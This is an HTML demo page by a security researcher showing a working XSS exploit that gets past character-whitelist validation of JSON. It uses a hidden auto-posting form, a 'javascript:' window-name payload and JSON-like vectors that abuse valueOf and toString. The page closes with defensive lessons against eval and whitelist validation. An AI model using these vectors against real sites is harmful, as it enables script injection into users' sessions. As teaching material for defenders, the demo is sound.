<head>
<title>JSON server side validation bypass demo</title>
<script src="jquery.min.js"></script>
<script>

function jacksploit_named_form(url, fields, method, window_name) {
    method = method || "POST";
    var f = document.createElement('FORM');
    f.style.display = 'none';
    if (window_name) f.target = window_name;
    f.method = method;
    f.action = url;
    for (var field in fields) {
	if (fields.hasOwnProperty(field)) {
	  var tmp = document.createElement('INPUT');
	  tmp.name = field;
	  tmp.value = fields[field];
	  f.appendChild(tmp);
	}
    }
    document.body.appendChild(f);
    return f; 
}

$(function() {
    var url = location.href.replace('attacker','victim').replace('evil', 'victim');
    var payload = 'javascript:alert(/xss:/.source+ new Date())';
    if ($.browser.msie) {
	var fields =  {'json':'-{valueOf:location,length:1,0:name,toString:Array.prototype.join}'};
    } else {
        // we have to rely on a function present on victim site 
	var fields =  {'json':'-{valueOf:goto,length:1,0:name,toString:Array.prototype.join}'};
    }
    
    var form = jacksploit_named_form(url, fields, 'POST', payload);
    
    $('<a href=#>click me, brave one!</a>').click(function() {
	form.submit();
    }).appendTo('body');
    
});
</script>
</head>
<body>
<h1>JSON server side validation bypass DEMO</h1>
<h2>by <a rel=me href="http://blog.kotowicz.net">Krzysztof Kotowicz</a></h2>
<p>This is a exploit demo of a vulnerable server side input validation.
The <a href="victim.php">vulnerable page</a> (see <a href="victim.php?source">full source</a>) accepts JSON data posted in a form and then uses it in Javascript.
To protect from XSS, it validates server-side and only allows certain characters: <code>-a-zA-Z0-9,.:"{}</code> and a space, making it very tricky to find
a bypass. But theoretically it's possible in all browsers and, thanks to <a href="http://p42.us/ie8xss/IE8%20Filters.ppt">Sidarckcat and Thornmaker research</a>
there's a working vector for IE.
<p>
Lessons to learn:
<ul>
<li>If you accept JSON input, make sure it's a <a href=http://www.json.org/>legit JSON</a> input (JSON's is a subset of Javascript!). In PHP you can use <code>json_decode()</code></li>
<li>Validating JSON using character whitelist is a dead end. Don't do it. There are really tricky vectors around.</li>
<li>Don't use eval! There's <code>JSON.parse()</code> built into newer browsers, for older - use <a href="https://github.com/douglascrockford/JSON-js/blob/master/json2.js">this</a>.</li>
</ul>
<p>Read more:
<ul>
<li><a href="http://p42.us/ie8xss/IE8%20Filters.ppt">http://p42.us/ie8xss/IE8%20Filters.ppt</a></li>
<li><a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html</a></li>
<li><a href="https://github.com/douglascrockford/JSON-js/blob/master/json2.js">https://github.com/douglascrockford/JSON-js/blob/master/json2.js</a></li>
</ul>
<h3>And now for the exploit</h3>
</body>